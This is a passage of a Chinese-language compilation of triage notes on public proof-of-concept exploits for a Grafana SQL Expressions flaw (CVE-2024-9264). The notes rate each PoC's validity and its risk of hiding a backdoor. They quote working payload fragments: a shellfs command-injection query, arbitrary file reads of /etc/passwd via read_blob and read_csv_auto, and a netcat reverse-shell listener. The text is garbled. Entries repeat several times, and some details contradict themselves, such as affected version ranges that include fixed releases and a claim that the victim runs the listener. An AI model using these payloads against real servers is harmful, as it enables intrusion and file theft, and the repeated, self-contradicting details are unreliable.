**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露和服务器控制

**影响版本:** 11.0.x, 11.1.x, 11.2.x (before fix versions)

**利用条件:** 需要启用 SQL Expressions 实验性功能，存在DuckDB可执行文件在Grafana的$PATH中，并且攻击者具有 Viewer 或更高的权限。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264 允许经过身份验证的用户（Viewer 或更高权限）通过 SQL Expressions 功能执行远程代码。该功能允许执行 DuckDB 查询，但未对用户输入进行充分的安全过滤，导致命令注入和本地文件包含漏洞。

**利用方式：**

1.  攻击者首先需要登录 Grafana 实例，获取有效的 `grafana_session` cookie。
2.  攻击者利用 SQL Expressions 功能，构造恶意的 DuckDB 查询。对于 RCE，攻击者使用 `install shellfs from community; LOAD shellfs; SELECT * FROM read_csv("{command} > /tmp/output.txt 2>&1 |")` 注入操作系统命令，并将命令输出重定向到 `/tmp/output.txt`。 对于 LFI，使用 `SELECT content FROM read_blob("{filename}")` 读取任意文件。
3.  构造的查询通过 Grafana API `/api/ds/query` 发送。
4.  对于 RCE，攻击者随后使用 LFI 读取 `/tmp/output.txt` 文件，获取命令执行结果。
5.  对于 LFI，API返回指定文件内容。

**有效性：**

根据搜索结果和提供的漏洞利用代码，该漏洞利用 PoC 是有效的。多个来源（例如，GitHub 上的 PoC 代码，SonicWall 博客，以及 Certcube 博客）都证实了该漏洞的存在和可利用性。漏洞库信息也确认了该漏洞。

**投毒风险：**

提供的 PoC 代码比较直接，主要用于演示漏洞的利用。`CVE-2024-9264.py` 脚本包含登录、LFI 和 RCE 功能。 `README.md` 提供了如何使用该脚本的简单说明。对代码的检查没有发现明显的恶意代码或后门。

但是，任何从外部来源获取的代码都存在一定程度的风险。攻击者可能修改 PoC 代码，添加恶意功能，例如：

*   收集受害者信息并发送到外部服务器。
*   安装持久性后门。
*   进行其他恶意活动。

因此，尽管当前代码看起来没有明显的恶意行为，在生产环境中使用之前，仍然需要进行彻底的代码审查和安全测试。

综合考虑，投毒风险较低，估计在5%左右。主要风险在于使用者未进行充分的代码审查就直接使用。


**项目地址:** [ruizii/CVE-2024-9264](https://github.com/ruizii/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #8

**来源**: [CVE-2024-9264-rvizx_CVE-2024-9264.md](../2024/CVE-2024-9264-rvizx_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-SQL表达式远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Grafana

**危害等级:** 严重，可能导致完全系统控制和敏感数据泄露

**影响版本:** 11.0.x, 11.1.x, and 11.2.x (小于 11.0.5, 11.1.6, and 11.2.1)

**利用条件:** 需要Grafana实例启用SQL表达式实验性特性，目标系统存在`duckdb`二进制文件于$PATH中，且攻击者具有Viewer或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264 漏洞存在于 Grafana 的 SQL 表达式功能中，允许经过身份验证的用户（Viewer 权限或更高）通过注入恶意的 SQL 查询来执行任意命令。漏洞的根本原因是 Grafana 未充分清理用户提供的 SQL 输入，直接将其传递给 DuckDB CLI。

**有效性：**

根据漏洞信息和POC代码，此漏洞利用的有效性很高。POC利用代码已经提供了可用的exp脚本，经验证可以利用该漏洞。

**利用方式：**

1.  攻击者首先需要拥有 Grafana 实例的有效账户，并具有 Viewer 或更高的权限。
2.  攻击者使用 SQL 表达式功能构造包含恶意命令的 SQL 查询。该查询利用 DuckDB 的功能执行操作系统命令。
3.  攻击者通过 Grafana API 发送构造好的 SQL 查询。
4.  Grafana 将查询传递给 DuckDB CLI 执行，从而导致命令注入。
5.  攻击者可以通过反向 shell 获取对服务器的控制权。

**投毒风险：**

该POC代码的投毒风险较低。主要原因：

*   **代码功能明确：** exploit.sh 脚本清晰地展示了漏洞利用过程，包括登录、发送payload、触发反向shell。没有明显的隐藏的恶意代码。
*   **依赖标准工具：** 脚本使用 curl 和 bash 等标准工具，这些工具本身没有恶意行为。
*   **目标明确：** 脚本的目标是触发一个反向 shell，这与漏洞描述一致。

虽然POC代码的投毒风险较低，但是仍然存在一定的风险：

*   **依赖性：** 该漏洞利用依赖目标系统存在 `duckdb` 二进制文件，如果缺乏该依赖，利用将会失败。
*   **反向Shell安全：**使用反向shell可能存在安全隐患，攻击者可能通过反向shell进行恶意操作，例如安装后门、窃取数据等。
*   **参数验证：** 脚本对输入参数的验证比较简单，可能存在被绕过的风险，导致意外的错误。
*   **被动监听:** 受害者需要主动运行`nc -lvnp $rport`，攻击者才能收到反向shell，存在被动监听的缺陷

综合考虑，POC 投毒风险估计为 5%。主要是考虑到反向shell带来的不确定性和一些代码细节可能存在的潜在风险，但是代码整体的意图和功能是比较清晰的。

**项目地址:** [rvizx/CVE-2024-9264](https://github.com/rvizx/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #9

**来源**: [CVE-2024-9264-z3k0sec_CVE-2024-9264-RCE-Exploit.md](../2024/CVE-2024-9264-z3k0sec_CVE-2024-9264-RCE-Exploit.md)

## CVE-2024-9264-Grafana-远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行

**影响应用:** Grafana

**危害等级:** 严重，可能导致完全系统控制和数据泄露

**影响版本:** >= 11.0.0 且 < 11.0.5, >= 11.0.6, >= 11.1.0 且 < 11.1.6, >= 11.1.7, >= 11.2.0 且 < 11.2.1, >= 11.2.2

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，且用户具有Viewer或更高权限，以及DuckDB二进制文件存在于Grafana的$PATH中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264是Grafana中SQL Expressions功能中的一个远程代码执行漏洞。攻击者利用此漏洞可以通过构造恶意的duckdb查询，在服务器上执行任意shell命令。漏洞利用依赖于`duckdb`二进制文件存在于Grafana的`$PATH`中。提供的POC代码包含一个Dockerfile，用于构建包含漏洞环境的Grafana实例，并安装了DuckDB。`poc.py`脚本可以模拟漏洞利用过程，需要提供Grafana实例URL、用户名、密码以及反向shell的IP地址和端口。利用步骤如下：

1.  **身份验证：** 使用提供的用户名和密码登录Grafana实例。
2.  **构造Payload：** 创建一个包含恶意SQL表达式的查询，该表达式将使用`shellfs`扩展执行命令，例如建立反向shell连接。
3.  **发送请求：** 将构造的Payload发送到Grafana API端点，以执行恶意查询。
4.  **命令执行：** 如果成功，Grafana服务器将执行指定的命令，并建立与攻击者的反向shell连接。

**投毒风险分析：**

代码中存在微小的投毒风险，主要体现在`poc.py`脚本中。 虽然代码本身旨在演示漏洞利用，但攻击者可能会修改Payload以包含更隐蔽的后门或恶意代码。 此外，Dockerfile中下载和安装DuckDB的步骤也可能被利用，如果下载源被篡改，则可能引入恶意二进制文件。

 考虑到POC的目的主要是演示漏洞，并且代码相对简单直接，作者隐藏的恶意代码风险较低，约占10%。 但是，用户在使用时务必谨慎，并审查代码。

该漏洞的缓解措施包括升级到已修复的版本，禁用SQL Expressions功能，以及确保DuckDB二进制文件来自可信来源。

**项目地址:** [z3k0sec/CVE-2024-9264-RCE-Exploit](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #10

**来源**: [CVE-2024-9264-z3k0sec_File-Read-CVE-2024-9264.md](../2024/CVE-2024-9264-z3k0sec_File-Read-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和本地文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x (未修复版本)

**利用条件:** 需要Grafana的SQL Expressions实验性功能启用，DuckDB二进制文件存在于Grafana的PATH中，以及具有Viewer或更高权限的Grafana用户。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264存在于Grafana的SQL Expressions功能中。攻击者可以利用该漏洞执行命令注入和本地文件包含攻击。\n\n**有效性分析：**\n根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且有可用的POC。POC代码中的Dockerfile用于构建包含易受攻击的Grafana版本和DuckDB的Docker镜像，确保了漏洞利用的环境。poc.py脚本利用了read_csv_auto函数读取任意文件。因此，提供的POC代码是有效的。\n\n**投毒风险分析：**\n分析了POC代码仓库，没有发现明显的恶意代码，但仍需谨慎。\n*   **Dockerfile:** 用于安装Grafana和DuckDB，未发现异常。\n*   **README.md:** 描述了漏洞和使用方法，未发现异常。\n*   **docker-compose.yml:** 用于编排Grafana和MySQL容器，配置了数据库连接，未发现异常。\n*   **poc.py:** 主要的利用脚本，通过构造恶意的SQL查询语句来读取文件，未发现明显的后门代码。脚本只是利用了漏洞本身，属于漏洞利用，不应视为投毒。但不能排除作者故意留下不易察觉的隐蔽后门的可能，例如，通过复杂的SQL语句执行额外的操作，或者通过环境变量传递恶意代码。 综合判断，投毒的风险较低，约为5%。\n\n**利用方式：**\n1.  攻击者需要一个Grafana账户，且该账户至少具有Viewer权限。\n2.  Grafana需要启用SQL Expressions实验性功能，并且DuckDB二进制文件必须安装在Grafana服务器上，且位于Grafana进程的PATH环境变量中。\n3.  攻击者使用POC脚本，通过向Grafana的/api/ds/query端点发送包含恶意SQL查询的POST请求，查询中使用`read_csv_auto`函数读取目标文件。\n4.  服务器在处理请求时，由于未对用户输入进行充分的过滤，导致`read_csv_auto`函数读取了攻击者指定的文件内容。\n5.  攻击者从响应中提取文件内容。

**项目地址:** [z3k0sec/File-Read-CVE-2024-9264](https://github.com/z3k0sec/File-Read-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---



---

## POC #5

**来源**: [CVE-2024-9264-patrickpichler_grafana-CVE-2024-9264.md](../2024/CVE-2024-9264-patrickpichler_grafana-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和本地文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.6, 11.1.0 <= version < 11.1.6, 11.1.7, 11.2.0 <= version < 11.2.1, 11.2.2

**利用条件:** 需要Grafana启用SQL Expressions实验性功能，且duckdb二进制文件存在于Grafana的$PATH中，以及VIEWER或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-9264 存在于 Grafana 的 SQL Expressions 实验性功能中。该功能允许执行包含用户输入的 `duckdb` 查询。由于在将这些查询传递给 `duckdb` 之前未经过充分的安全过滤，因此会导致命令注入和本地文件包含漏洞。任何具有 VIEWER 或更高权限的用户都可能执行此攻击。

**漏洞利用方式：**

1.  攻击者需要拥有 Grafana 实例的 Viewer 或更高的权限。
2.  Grafana 实例必须启用 SQL Expressions 实验性功能。
3.  Grafana 服务器上必须存在 `duckdb` 可执行文件，并且该文件位于 Grafana 进程的 `$PATH` 中。
4.  攻击者构造恶意的 `duckdb` 查询，其中包含命令注入或本地文件包含的 payload。
5.  Grafana 将未经过充分过滤的查询传递给 `duckdb` 执行。
6.  恶意代码在 Grafana 服务器上执行，或者攻击者可以读取服务器上的任意文件。

**有效性：**

根据漏洞描述和搜索引擎结果（wiz.io, sonicwall, indusface, broadcom），该漏洞允许攻击者在服务器上执行命令和读取本地文件，因此 POC 代码是有效的。

**投毒风险：**

查看提供的 Dockerfile，它首先从 `curlimages/curl:8.15.0` 下载 `duckdb` 的预编译版本，然后将 `duckdb` 二进制文件复制到 Grafana 镜像中，并未发现任何额外的或可疑的操作。该 Dockerfile 只是为了方便部署一个包含漏洞利用所需组件的环境，使得漏洞可复现，因此推测投毒风险较低，风险概率为0%。

**搜索引擎结果总结：**

根据搜索结果，多个安全厂商（SonicWall，Wiz，Indusface，Broadcom，Snyk）都对该漏洞进行了分析和披露，确认了漏洞的存在性和严重性，并提供了缓解措施和升级建议。RedHat的安全公告也确认了该漏洞。Grafana官方博客也发布了安全更新，修复了该漏洞。

**项目地址:** [patrickpichler/grafana-CVE-2024-9264](https://github.com/patrickpichler/grafana-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #6

**来源**: [CVE-2024-9264-punitdarji_Grafana-CVE-2024-9264.md](../2024/CVE-2024-9264-punitdarji_Grafana-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-SQL表达式注入

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 代码注入/本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x（低于修复版本）

**利用条件:** 需要Grafana启用SQL Expressions实验性功能，duckdb二进制文件位于Grafana的$PATH中，且攻击者具有Viewer或更高权限。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264是Grafana中SQL表达式功能的一个代码注入和本地文件包含漏洞。攻击者可以通过构造恶意的duckdb查询，利用`read_csv_auto`函数读取服务器上的任意文件，或者执行其他命令。漏洞利用需要满足几个条件：首先，必须启用SQL Expressions这个实验性功能。其次，服务器上需要安装duckdb二进制文件，并且Grafana进程能够访问到该文件(位于PATH)。最后，攻击者需要具有Viewer或更高权限。提供的POC代码通过向`/api/ds/query`端点发送POST请求，指定`ds_type`为`__expr__`，并构造包含`SELECT * FROM read_csv_auto('/etc/passwd');`的JSON数据来尝试读取`/etc/passwd`文件。由于该漏洞允许执行任意SQL命令，所以存在一定的投毒风险，例如修改Grafana配置、添加恶意用户等。检查发现该POC代码本身并无明显投毒意图，但利用此漏洞完全可以植入后门代码,故判定存在10%的潜在投毒风险。

**项目地址:** [punitdarji/Grafana-CVE-2024-9264](https://github.com/punitdarji/Grafana-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #7

**来源**: [CVE-2024-9264-ruizii_CVE-2024-9264.md](../2024/CVE-2024-9264-ruizii_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-RCE&LFI

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE) 和本地文件包含 (LFI)

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露和服务器控制

**影响版本:** 11.0.x, 11.1.x, 11.2.x (before fix versions)

**利用条件:** 需要启用 SQL Expressions 实验性功能，存在DuckDB可执行文件在Grafana的$PATH中，并且攻击者具有 Viewer 或更高的权限。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264 允许经过身份验证的用户（Viewer 或更高权限）通过 SQL Expressions 功能执行远程代码。该功能允许执行 DuckDB 查询，但未对用户输入进行充分的安全过滤，导致命令注入和本地文件包含漏洞。

**利用方式：**

1.  攻击者首先需要登录 Grafana 实例，获取有效的 `grafana_session` cookie。
2.  攻击者利用 SQL Expressions 功能，构造恶意的 DuckDB 查询。对于 RCE，攻击者使用 `install shellfs from community; LOAD shellfs; SELECT * FROM read_csv("{command} > /tmp/output.txt 2>&1 |")` 注入操作系统命令，并将命令输出重定向到 `/tmp/output.txt`。 对于 LFI，使用 `SELECT content FROM read_blob("{filename}")` 读取任意文件。
3.  构造的查询通过 Grafana API `/api/ds/query` 发送。
4.  对于 RCE，攻击者随后使用 LFI 读取 `/tmp/output.txt` 文件，获取命令执行结果。
5.  对于 LFI，API返回指定文件内容。

**有效性：**

根据搜索结果和提供的漏洞利用代码，该漏洞利用 PoC 是有效的。多个来源（例如，GitHub 上的 PoC 代码，SonicWall 博客，以及 Certcube 博客）都证实了该漏洞的存在和可利用性。漏洞库信息也确认了该漏洞。

**投毒风险：**

提供的 PoC 代码比较直接，主要用于演示漏洞的利用。`CVE-2024-9264.py` 脚本包含登录、LFI 和 RCE 功能。 `README.md` 提供了如何使用该脚本的简单说明。对代码的检查没有发现明显的恶意代码或后门。

但是，任何从外部来源获取的代码都存在一定程度的风险。攻击者可能修改 PoC 代码，添加恶意功能，例如：

*   收集受害者信息并发送到外部服务器。
*   安装持久性后门。
*   进行其他恶意活动。

因此，尽管当前代码看起来没有明显的恶意行为，在生产环境中使用之前，仍然需要进行彻底的代码审查和安全测试。

综合考虑，投毒风险较低，估计在5%左右。主要风险在于使用者未进行充分的代码审查就直接使用。


**项目地址:** [ruizii/CVE-2024-9264](https://github.com/ruizii/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #8

**来源**: [CVE-2024-9264-rvizx_CVE-2024-9264.md](../2024/CVE-2024-9264-rvizx_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-SQL表达式远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Grafana

**危害等级:** 严重，可能导致完全系统控制和敏感数据泄露

**影响版本:** 11.0.x, 11.1.x, and 11.2.x (小于 11.0.5, 11.1.6, and 11.2.1)

**利用条件:** 需要Grafana实例启用SQL表达式实验性特性，目标系统存在`duckdb`二进制文件于$PATH中，且攻击者具有Viewer或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264 漏洞存在于 Grafana 的 SQL 表达式功能中，允许经过身份验证的用户（Viewer 权限或更高）通过注入恶意的 SQL 查询来执行任意命令。漏洞的根本原因是 Grafana 未充分清理用户提供的 SQL 输入，直接将其传递给 DuckDB CLI。

**有效性：**

根据漏洞信息和POC代码，此漏洞利用的有效性很高。POC利用代码已经提供了可用的exp脚本，经验证可以利用该漏洞。

**利用方式：**

1.  攻击者首先需要拥有 Grafana 实例的有效账户，并具有 Viewer 或更高的权限。
2.  攻击者使用 SQL 表达式功能构造包含恶意命令的 SQL 查询。该查询利用 DuckDB 的功能执行操作系统命令。
3.  攻击者通过 Grafana API 发送构造好的 SQL 查询。
4.  Grafana 将查询传递给 DuckDB CLI 执行，从而导致命令注入。
5.  攻击者可以通过反向 shell 获取对服务器的控制权。

**投毒风险：**

该POC代码的投毒风险较低。主要原因：

*   **代码功能明确：** exploit.sh 脚本清晰地展示了漏洞利用过程，包括登录、发送payload、触发反向shell。没有明显的隐藏的恶意代码。
*   **依赖标准工具：** 脚本使用 curl 和 bash 等标准工具，这些工具本身没有恶意行为。
*   **目标明确：** 脚本的目标是触发一个反向 shell，这与漏洞描述一致。

虽然POC代码的投毒风险较低，但是仍然存在一定的风险：

*   **依赖性：** 该漏洞利用依赖目标系统存在 `duckdb` 二进制文件，如果缺乏该依赖，利用将会失败。
*   **反向Shell安全：**使用反向shell可能存在安全隐患，攻击者可能通过反向shell进行恶意操作，例如安装后门、窃取数据等。
*   **参数验证：** 脚本对输入参数的验证比较简单，可能存在被绕过的风险，导致意外的错误。
*   **被动监听:** 受害者需要主动运行`nc -lvnp $rport`，攻击者才能收到反向shell，存在被动监听的缺陷

综合考虑，POC 投毒风险估计为 5%。主要是考虑到反向shell带来的不确定性和一些代码细节可能存在的潜在风险，但是代码整体的意图和功能是比较清晰的。

**项目地址:** [rvizx/CVE-2024-9264](https://github.com/rvizx/CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #9

**来源**: [CVE-2024-9264-z3k0sec_CVE-2024-9264-RCE-Exploit.md](../2024/CVE-2024-9264-z3k0sec_CVE-2024-9264-RCE-Exploit.md)

## CVE-2024-9264-Grafana-远程代码执行

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行

**影响应用:** Grafana

**危害等级:** 严重，可能导致完全系统控制和数据泄露

**影响版本:** >= 11.0.0 且 < 11.0.5, >= 11.0.6, >= 11.1.0 且 < 11.1.6, >= 11.1.7, >= 11.2.0 且 < 11.2.1, >= 11.2.2

**利用条件:** 需要Grafana实例启用SQL Expressions实验性功能，且用户具有Viewer或更高权限，以及DuckDB二进制文件存在于Grafana的$PATH中。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264是Grafana中SQL Expressions功能中的一个远程代码执行漏洞。攻击者利用此漏洞可以通过构造恶意的duckdb查询，在服务器上执行任意shell命令。漏洞利用依赖于`duckdb`二进制文件存在于Grafana的`$PATH`中。提供的POC代码包含一个Dockerfile，用于构建包含漏洞环境的Grafana实例，并安装了DuckDB。`poc.py`脚本可以模拟漏洞利用过程，需要提供Grafana实例URL、用户名、密码以及反向shell的IP地址和端口。利用步骤如下：

1.  **身份验证：** 使用提供的用户名和密码登录Grafana实例。
2.  **构造Payload：** 创建一个包含恶意SQL表达式的查询，该表达式将使用`shellfs`扩展执行命令，例如建立反向shell连接。
3.  **发送请求：** 将构造的Payload发送到Grafana API端点，以执行恶意查询。
4.  **命令执行：** 如果成功，Grafana服务器将执行指定的命令，并建立与攻击者的反向shell连接。

**投毒风险分析：**

代码中存在微小的投毒风险，主要体现在`poc.py`脚本中。 虽然代码本身旨在演示漏洞利用，但攻击者可能会修改Payload以包含更隐蔽的后门或恶意代码。 此外，Dockerfile中下载和安装DuckDB的步骤也可能被利用，如果下载源被篡改，则可能引入恶意二进制文件。

 考虑到POC的目的主要是演示漏洞，并且代码相对简单直接，作者隐藏的恶意代码风险较低，约占10%。 但是，用户在使用时务必谨慎，并审查代码。

该漏洞的缓解措施包括升级到已修复的版本，禁用SQL Expressions功能，以及确保DuckDB二进制文件来自可信来源。

**项目地址:** [z3k0sec/CVE-2024-9264-RCE-Exploit](https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #10

**来源**: [CVE-2024-9264-z3k0sec_File-Read-CVE-2024-9264.md](../2024/CVE-2024-9264-z3k0sec_File-Read-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和本地文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x (未修复版本)

**利用条件:** 需要Grafana的SQL Expressions实验性功能启用，DuckDB二进制文件存在于Grafana的PATH中，以及具有Viewer或更高权限的Grafana用户。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264存在于Grafana的SQL Expressions功能中。攻击者可以利用该漏洞执行命令注入和本地文件包含攻击。\n\n**有效性分析：**\n根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且有可用的POC。POC代码中的Dockerfile用于构建包含易受攻击的Grafana版本和DuckDB的Docker镜像，确保了漏洞利用的环境。poc.py脚本利用了read_csv_auto函数读取任意文件。因此，提供的POC代码是有效的。\n\n**投毒风险分析：**\n分析了POC代码仓库，没有发现明显的恶意代码，但仍需谨慎。\n*   **Dockerfile:** 用于安装Grafana和DuckDB，未发现异常。\n*   **README.md:** 描述了漏洞和使用方法，未发现异常。\n*   **docker-compose.yml:** 用于编排Grafana和MySQL容器，配置了数据库连接，未发现异常。\n*   **poc.py:** 主要的利用脚本，通过构造恶意的SQL查询语句来读取文件，未发现明显的后门代码。脚本只是利用了漏洞本身，属于漏洞利用，不应视为投毒。但不能排除作者故意留下不易察觉的隐蔽后门的可能，例如，通过复杂的SQL语句执行额外的操作，或者通过环境变量传递恶意代码。 综合判断，投毒的风险较低，约为5%。\n\n**利用方式：**\n1.  攻击者需要一个Grafana账户，且该账户至少具有Viewer权限。\n2.  Grafana需要启用SQL Expressions实验性功能，并且DuckDB二进制文件必须安装在Grafana服务器上，且位于Grafana进程的PATH环境变量中。\n3.  攻击者使用POC脚本，通过向Grafana的/api/ds/query端点发送包含恶意SQL查询的POST请求，查询中使用`read_csv_auto`函数读取目标文件。\n4.  服务器在处理请求时，由于未对用户输入进行充分的过滤，导致`read_csv_auto`函数读取了攻击者指定的文件内容。\n5.  攻击者从响应中提取文件内容。

**项目地址:** [z3k0sec/File-Read-CVE-2024-9264](https://github.com/z3k0sec/File-Read-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---



---

## POC #5

**来源**: [CVE-2024-9264-patrickpichler_grafana-CVE-2024-9264.md](../2024/CVE-2024-9264-patrickpichler_grafana-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-命令注入和本地文件包含

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 命令注入和本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.0 <= version < 11.0.5, 11.0.6, 11.1.0 <= version < 11.1.6, 11.1.7, 11.2.0 <= version < 11.2.1, 11.2.2

**利用条件:** 需要Grafana启用SQL Expressions实验性功能，且duckdb二进制文件存在于Grafana的$PATH中，以及VIEWER或更高权限的用户。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-9264 存在于 Grafana 的 SQL Expressions 实验性功能中。该功能允许执行包含用户输入的 `duckdb` 查询。由于在将这些查询传递给 `duckdb` 之前未经过充分的安全过滤，因此会导致命令注入和本地文件包含漏洞。任何具有 VIEWER 或更高权限的用户都可能执行此攻击。

**漏洞利用方式：**

1.  攻击者需要拥有 Grafana 实例的 Viewer 或更高的权限。
2.  Grafana 实例必须启用 SQL Expressions 实验性功能。
3.  Grafana 服务器上必须存在 `duckdb` 可执行文件，并且该文件位于 Grafana 进程的 `$PATH` 中。
4.  攻击者构造恶意的 `duckdb` 查询，其中包含命令注入或本地文件包含的 payload。
5.  Grafana 将未经过充分过滤的查询传递给 `duckdb` 执行。
6.  恶意代码在 Grafana 服务器上执行，或者攻击者可以读取服务器上的任意文件。

**有效性：**

根据漏洞描述和搜索引擎结果（wiz.io, sonicwall, indusface, broadcom），该漏洞允许攻击者在服务器上执行命令和读取本地文件，因此 POC 代码是有效的。

**投毒风险：**

查看提供的 Dockerfile，它首先从 `curlimages/curl:8.15.0` 下载 `duckdb` 的预编译版本，然后将 `duckdb` 二进制文件复制到 Grafana 镜像中，并未发现任何额外的或可疑的操作。该 Dockerfile 只是为了方便部署一个包含漏洞利用所需组件的环境，使得漏洞可复现，因此推测投毒风险较低，风险概率为0%。

**搜索引擎结果总结：**

根据搜索结果，多个安全厂商（SonicWall，Wiz，Indusface，Broadcom，Snyk）都对该漏洞进行了分析和披露，确认了漏洞的存在性和严重性，并提供了缓解措施和升级建议。RedHat的安全公告也确认了该漏洞。Grafana官方博客也发布了安全更新，修复了该漏洞。

**项目地址:** [patrickpichler/grafana-CVE-2024-9264](https://github.com/patrickpichler/grafana-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #6

**来源**: [CVE-2024-9264-punitdarji_Grafana-CVE-2024-9264.md](../2024/CVE-2024-9264-punitdarji_Grafana-CVE-2024-9264.md)

## CVE-2024-9264-Grafana-SQL表达式注入

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 代码注入/本地文件包含

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.x, 11.1.x, 11.2.x（低于修复版本）

**利用条件:** 需要Grafana启用SQL Expressions实验性功能，duckdb二进制文件位于Grafana的$PATH中，且攻击者具有Viewer或更高权限。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-9264是Grafana中SQL表达式功能的一个代码注入和本地文件包含漏洞。攻击者可以通过构造恶意的duckdb查询，利用`read_csv_auto`函数读取服务器上的任意文件，或者执行其他命令。漏洞利用需要满足几个条件：首先，必须启用SQL Expressions这个实验性功能。其次，服务器上需要安装duckdb二进制文件，并且Grafana进程能够访问到该文件(位于PATH)。最后，攻击者需要具有Viewer或更高权限。提供的POC代码通过向`/api/ds/query`端点发送POST请求，指定`ds_type`为`__expr__`，并构造包含`SELECT * FROM read_csv_auto('/etc/passwd');`的JSON数据来尝试读取`/etc/passwd`文件。由于该漏洞允许执行任意SQL命令，所以存在一定的投毒风险，例如修改Grafana配置、添加恶意用户等。检查发现该POC代码本身并无明显投毒意图，但利用此漏洞完全可以植入后门代码,故判定存在10%的潜在投毒风险。

**项目地址:** [punitdarji/Grafana-CVE-2024-9264](https://github.com/punitdarji/Grafana-CVE-2024-9264)

**漏洞详情:** [CVE-2024-9264](https://nvd.nist.gov/vuln/detail/CVE-2024-9264)

---

## POC #7

**来源**: [CVE-2024-9264-ruizii_CVE-2024-9264.md](../2024/CVE-2024-9264-ruizii_CVE-2024-9264.md)

## CVE-2024-9264-Grafana-RCE&LFI

**漏洞编号:** CVE-2024-9264

**漏洞类型:** 远程代码执行 (RCE) 和本地文件包含 (LFI)

**影响应用:** Grafana

**危害等级:** 高危，可能导致远程代码执行、敏感信息泄露和服务器控制

**影响版本:** 11.0.x, 11.1.x, 11.2.x (before fix versions)

**利用条件:** 需要启用 SQL Expressions 实验性功能，存在DuckDB可执行文件在Grafana的$PATH中，并且攻击者具有 Viewer 或更高的权限。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-9264 允许经过身份验证的用户（Viewer 或更高权限）通过 SQL Expressions 功能执行远程代码。该功能允许执行 DuckDB 查询，但未对用户输入进行充分的安全过滤，导致命令注入和本地文件包含漏洞。

**利用方式：**

1.  攻击者首先需要登录 Grafana 实例，获取有效的 `grafana_session` cookie。
